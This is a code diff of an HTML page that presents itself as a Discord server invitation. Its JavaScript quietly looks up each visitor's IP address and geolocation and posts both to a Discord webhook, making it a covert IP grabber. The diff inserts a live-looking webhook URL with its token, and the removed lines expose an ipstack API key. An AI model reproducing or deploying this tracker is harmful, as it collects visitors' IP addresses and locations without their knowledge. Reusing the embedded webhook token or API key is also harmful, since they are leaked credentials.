@@ -19,7 +19,7 @@
       }
       
       function sendToWebhook(ip, location) {
-        const webhookURL = "https://discord.com/api/webhooks/WEBHOOK_ID/WEBHOOK_TOKEN"; // Replace with the actual webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
         const message = "IP: " + ip + "\nLocation: " + location;
         
         fetch(webhookURL, {
@@ -34,14 +34,13 @@
       }
       
       function getLocation(ip) {
-        const accessKey = "060fa245df069e9bb3fa1889d85e7e50"; // Replace with your IP Geolocation API access key
-        const locationUrl = `http://api.ipstack.com/${ip}?access_key=${accessKey}`;
+        const locationUrl = `https://ipapi.co/${ip}/json/`;
         
         fetch(locationUrl)
           .then((response) => response.json())
           .then((data) => {
             const locationElement = document.getElementById("location");
-            const locationString = `${data.city}, ${data.region_name}, ${data.country_name}`;
+            const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
             locationElement.textContent = locationString;
             
             sendToWebhook(ip, locationString);
@@ -60,3 +59,4 @@
     <div> If you would like to join us, please join our Discord server: <a href="https://discord.gg/SXez2zT9">https://discord.gg/SXez2zT9</a></div>
   </body>
 </html>
+
